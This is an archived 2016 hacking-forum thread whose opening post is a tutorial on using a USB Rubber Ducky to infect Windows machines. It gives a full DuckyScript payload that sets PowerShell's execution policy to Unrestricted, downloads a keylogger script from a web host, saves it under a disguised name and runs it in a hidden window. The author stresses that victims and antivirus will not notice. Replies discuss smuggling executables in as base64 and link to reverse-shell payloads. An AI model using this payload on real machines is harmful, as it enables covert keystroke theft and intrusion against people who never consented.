<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Plug In To Win - DuckyScript [Part 1/3] - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hey Mates! 
This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. @Occupytheweb wrote an article about its use in Mr. Robot. 
At the end of this smal&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="1154.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Plug In To Win - DuckyScript [Part 1/3]&#39;" href="1154.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154" />
<meta name="twitter:url" content="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154" />
<meta property="og:title" content="Plug In To Win - DuckyScript [Part 1/3]" />
<meta name="twitter:title" content="Plug In To Win - DuckyScript [Part 1/3]" />
<meta property="og:description" content="Hey Mates!  This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. @Occupytheweb wrote an article about its use in Mr. Robot.  At the end of this small series you should be able to write your own Scripts for hacking the box just with an USB Stick and without the need of knowledge of any programming language!   Structure Part 1: How to use DuckyScript for writing a FUD file downloader &amp; executor  Part 2: How to use Powershell (..." />
<meta name="twitter:description" content="Hey Mates!  This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. @Occupytheweb wrote an article about its use in Mr. Robot.  At the end of this small series you should be able to write your own Scripts for hacking the box just with an USB Stick and without the need of knowledge of any programming language!   Structure Part 1: How to use DuckyScript for writing a FUD file downloader &amp; executor  Part 2: How to use Powershell (..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="duckyscript" />
<meta property="og:article:tag" content="badusb" />
<meta property="og:article:tag" content="plugintowin" />
<meta property="og:article:tag" content="usbrubberducky" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="12 ❤" />
<meta property="article:published_time" content="2016-10-01T07:08:27+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="1154.html">Plug In To Win - DuckyScript [Part 1/3]</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/duckyscript.html" class="discourse-tag" rel="tag">duckyscript</a>,
<a href="../../tag/badusb.html" class="discourse-tag" rel="tag">badusb</a>,
<a href="../../tag/plugintowin.html" class="discourse-tag" rel="tag">plugintowin</a>,
<a href="../../tag/usbrubberducky.html" class="discourse-tag" rel="tag">usbrubberducky</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Plug In To Win - DuckyScript [Part 1/3]">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="duckyscript, badusb, plugintowin, usbrubberducky">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T07:08:27Z" class="post-time">
October 1, 2016, 7:08am
</time>
<meta itemprop="dateModified" content="2016-10-01T14:06:12Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Hey Mates!</p>
<p>This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. <a class="mention" href="https://0x00sec.org/u/occupytheweb">@Occupytheweb</a> wrote an <a href="http://www.hackers-arise.com/single-post/2016/09/13/Mr-Robot-Hacks-How-Angela-Stole-Her-Bosss-Password-Using-mimikatz" rel="nofollow noopener">article</a> about its use in Mr. Robot.</p>
<p>At the end of this small series you should be able to write your own Scripts for hacking the box just with an USB Stick and without the need of knowledge of any programming language!</p>
<hr>
<h2>Structure</h2>
<p>Part 1: How to use DuckyScript for writing a FUD file downloader &amp; executor<br>
Part 2: How to use Powershell (Microsofts new shell; reminds of the linux terminal) for writing a FUD KeyLogger [Bonus]<br>
Part 3: How to build your own BadUSB for around 10$</p>
<hr>
<h2>USB Rubber Ducky</h2>
<p>[quote]“If it quacks like a keyboard and types like a keyboard, it must be a keyboard.”<br>
~ <a href="http://usbrubberducky.com" rel="nofollow noopener">Rubber Ducky Wiki</a>[/quote]<br>
This little quote tells us the main idea behind Bad USB. It’s a technique to convince the computer that we are not a USB Stick (Which can’t execute things on his own), but a completly normal and unsuspicious keyboard, controlled by the user. This is useful, because keyboards have the right to type (Wow, big surprise <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">).</p>
<p>[quote]“Humans use keyboards, and computers trust humans.”<br>
~ <a href="http://usbrubberducky.com" rel="nofollow noopener">Rubber Ducky Wiki</a>[/quote]<br>
The computer thinks we’re a normal user, who just wants to download a file via powershell. That’s not something disallowed, so it goes pretty unnoticed. If any warnings pop up, like “Don’t trust files from the internet”, we just press Enter and skip’em, because the <strong>keyboard rules!</strong></p>
<h2>Do I need the Rubber Ducky?</h2>
<p>I recommend using a Rubber Ducky for the following stuff, but it’s <strong>not required</strong>. In the third part I’ll explain how to build your own Bad USB for about 10$! Anyway, this one will be much harder to reprogram and to work with, so I highly recommend you to buy a Rubbber Ducky, when you are hooked <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<p>You can get it for 44.99$ at <a href="http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe" rel="nofollow noopener">Hak5hop</a>. The decision is yours <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<hr>
<h2>DuckyScript - Introduction</h2>
<p>Now we’ve got an USB Stick with a personality disorder, which thinks it’s a keyboard, but how does it know what it has to do on the target system? The answer is a script language, called DuckyScript. It’s syntax is pretty straightforward, it’s requirements are nearly not existent and the needed intelligence is just ridiculous <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<h3>Requirements</h3>
<ul>
<li>Any text editor</li>
<li>Duckencoder</li>
</ul>
<h3>Text Editor</h3>
<p>I think you’ll find one… gedit, Windows editor, vim, etc…</p>
<h3>Duckencoder</h3>
<p>The default Duckencoder.jar can be found at <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads" rel="nofollow noopener">github</a>. However, I’ve had some problems due to different keyboard layouts and searched for an alternative, so I stumbled upon <a href="https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/" rel="nofollow noopener">this</a> thread. There you can download a custom version of the Duckencoder, which supports different keyboard layouts.</p>
<h2>DuckyScript - Our Script</h2>
<p>I’ll cover just the basics and not all the keys you can use, because they can be already found <a href="http://usbrubberducky.com/#!duckyscript.md" rel="nofollow noopener">here</a>.</p>
<h3>Basics</h3>
<ul>
<li>You have to write every command on a new line</li>
<li>Don’t use blank lines (Never read it, but they seemed to break my script <img src="../../images/emoji/twitter/confused.png%3Fv=9" title=":confused:" class="emoji" alt=":confused:">)</li>
<li>Use REM for comments</li>
<li>Use STRING for typing normal letters (It presses automatically shift, when you use upper-case letters and symbols like !"§$)</li>
<li>Use GUI for pressing the Windos key</li>
<li>Use ENTER for pressing ENTER (Wow, that’s insane)</li>
<li>Use DELAY for waiting between new commands</li>
</ul>
<p>That’s all, what I’ve needed for writing my downloader &amp; executor script!</p>
<h3>Example Powershell Script Downloader &amp; Executor</h3>
<pre><code class="lang-auto">REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
</code></pre>
<p>First we set the Powershell <code>ExecutionPolicy</code> Setting to <code>Unrestricted</code>, so that our script can be executed on the target system. Maybe you’ve noticed that we just change the CurrentUsers setting. This requires no special privileges and works as good as changing the whole machines settings.</p>
<pre><code class="lang-auto">REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile("http://example.net/keylogger.ps1", "WinSys32.ps1")
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
</code></pre>
<p>Next we’re downloading the Powershell Script. This one uses the .Net WebClient, which can be called from within Powershell (During my little journey through Keyloggers I’ve found Powershell just awesome; I highly recommend everyone to have a look at it. Maybe I’ll make some basic tutorials about it in the future <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">). The command Downloads the file from the given Web-site, where you’ve put the script (<a href="http://example.net/keylogger.ps1" rel="nofollow noopener">http://example.net/keylogger.ps1</a>) and saves them under the given directory (As an example I use the current directory (Users directory) and the name “WinSys32.ps1”). Then we leave the Powershell console.</p>
<pre><code class="lang-auto">REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
</code></pre>
<p>Finally we run the Script as a background powershell process. This has two big advantages:</p>
<ul>
<li>The user can’t spot it easily</li>
<li>It runs under the name “Windows Powershell” with the default Powershell Icon. No user will think his own windows spys on him <img src="../../images/emoji/twitter/grin.png%3Fv=9" title=":grin:" class="emoji" alt=":grin:">. (Oh, and AVs don’t care either; more on that in the next part)</li>
</ul>
<h3>Full Script</h3>
<p>Here’s the full script, so that you don’t have to put the pieces together <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<pre><code class="lang-auto">REM Download &amp; Execute Powershell Script
REM ~ TheDoctor v1.3.3.7
REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile("http://example.net/keylogger.ps1", "WinSys32.ps1")
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
</code></pre>
<h3>How To Put That Script On Your Bad USB?</h3>
<p>With the USB Rubber Ducky it’s very easy. Just take the Micro-SD card, put it in a Micro-SD to SD adapter and plug it in your computer. Then build the script with the Duckencoder:</p>
<aside class="quote no-group">
<blockquote>
<p>Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin</p>
</blockquote>
</aside>
<p>Or when you want to compile with a specified keyboard layout (Only possible with the modified Duckencoder)</p>
<aside class="quote no-group">
<blockquote>
<p>Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin -l de</p>
</blockquote>
</aside>
<p>Where<br>
-i is the input file<br>
-o is the output file<br>
-l is the keyboard layout (Check the link to the <a href="https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/" rel="nofollow noopener">thread</a> for all possible layouts)</p>
<p>Now copy the inject.bin (No other name is allowed! The script has to be named inject.bin) to the Micro-SD card and plug it back into your Rubber Ducky. Finished.</p>
<p>With Bad USB it’s much more complicated, so I’ll explain it in the third part of the series.</p>
<hr>
<h2>Payload Collection</h2>
<p>You can find many different DuckyScripts <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="nofollow noopener">here</a>. It’s a good place to search for some techniques you can use, when writing your own scripts (Or to find scripts for trolling your friends, e.g. <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---You-got-quacked%21" rel="nofollow noopener">this one</a> <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">). There are some very interesting ones like <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---mimikatz-payload" rel="nofollow noopener">mimikatz</a>, <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---utilman-exploit" rel="nofollow noopener">utilman exploit</a> or a <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber" rel="nofollow noopener">WIFI password grabber</a>.</p>
<hr>
<h2>Conclusion</h2>
<p>Is it really that easy? Yes. Just write your own simple DuckyScript, plug in your Bad USB and… It’s won <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">. Oh, and don’t forget that you feel like a real 1337 h4xx0r, when you just have to put in your Stick and see magically popping up windows, filling with commands without anyones interaction <img src="../../images/emoji/twitter/sunglasses.png%3Fv=9" title=":sunglasses:" class="emoji" alt=":sunglasses:">.</p>
<p>In the next part we’ll talk about the Powershell Script, you have to download. Don’t expect a big introduction to Powershell, because I’m just a beginner, but I’m looking forward to explain you some basics.</p>
<p>|-TheDoctor-|</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="8" />
<span class="post-likes">8 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../using-a-teensy-to-install-stuff-in-a-few-seconds/1161.html">Using a Teensy to Install Stuff in a Few Seconds</a>
<meta itemprop="position" content="13">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T10:03:58Z" class="post-time">
October 1, 2016, 10:03am
</time>
<meta itemprop="dateModified" content="2016-10-01T10:03:58Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>MATE! This is soooooo good. I love it. I seriously should consider getting one… I think when I save some money up it’ll be on my list <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Keep up the AWESOME work!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T11:33:41Z" class="post-time">
October 1, 2016, 11:33am
</time>
<meta itemprop="dateModified" content="2016-10-01T11:33:41Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great Work! Can you also cover how to interact with executables stored on the internal sd card in the next tutorials?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T12:25:57Z" class="post-time">
October 1, 2016, 12:25pm
</time>
<meta itemprop="dateModified" content="2016-10-01T12:25:57Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I thought about it too, but it seems there’s no way to use any files on the SD card. The Rubber Ducky emulates perfectly a normal keyboard and as such it can’t exchange data with the computer from it’s storage. I had two ideas to circumvent that:</p>
<ul>
<li>Write executables byte data hardcoded into the script (An example of that technique can be found <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---reverse-shell" rel="nofollow noopener">here</a>)</li>
<li>Write custom firmware, which runs .exe named ‘inject.exe’ from your SD card (Just an idea; probably it doesn’t work, because Windows forbids it? I think this would have been already implemented, when it could work <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">. Maybe some of the C guys here want to have a look at the Rubber Duckys firmware and the ability of running arbitrary code? It could be read from the .exe on the SD card (Which seems to work; else DuckyScript shouldn’t work either) and run the given code in the keyboard drivers memory, isn’t it? You see, I’m just speculating <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">. I hope more experienced low-levels can answer this questions <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">)</li>
</ul>
<p>Anyway, that would be awesome, if you could run any .exe without having to worry about downloads. And when it could be run in the drivers memory, it should have ring0 rights, which would be another benefit <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<p>And <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> Christmas is near (At least almost near <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">). Maybe you can get one then <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T12:57:44Z" class="post-time">
October 1, 2016, 12:57pm
</time>
<meta itemprop="dateModified" content="2016-10-01T12:57:44Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I have an idea. You could base64 encrypt an executable; have it type it out and save it; then base64 decrypt.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T13:01:41Z" class="post-time">
October 1, 2016, 1:01pm
</time>
<meta itemprop="dateModified" content="2016-10-01T13:01:41Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yep, that’s the basic idea behind the <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---reverse-shell" rel="nofollow noopener">link</a> <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">. I think you wouldn’t even need the script he uses, just some powershell magic (As I said, I begin to love Powershell <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">).</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T13:47:07Z" class="post-time">
October 1, 2016, 1:47pm
</time>
<meta itemprop="dateModified" content="2016-10-01T13:47:07Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Don’t know much about the rubber ducky (planning to get one <img src="../../images/emoji/twitter/grin.png%3Fv=9" title=":grin:" class="emoji" alt=":grin:">), but did you have a look <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---runexe-from-sd" rel="nofollow noopener">here</a>?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T13:57:24Z" class="post-time">
October 1, 2016, 1:57pm
</time>
<meta itemprop="dateModified" content="2016-10-01T13:57:24Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yep, but that one is for identifying another plugged in USB Stick with the name ‘DUCKY’, where it then looks for a specific .exe, which is then executed <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">. If you’re interested in it, I can write about it, but it require you to put in two Sticks (The Bad USB &amp; The Stick with the .exe).</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
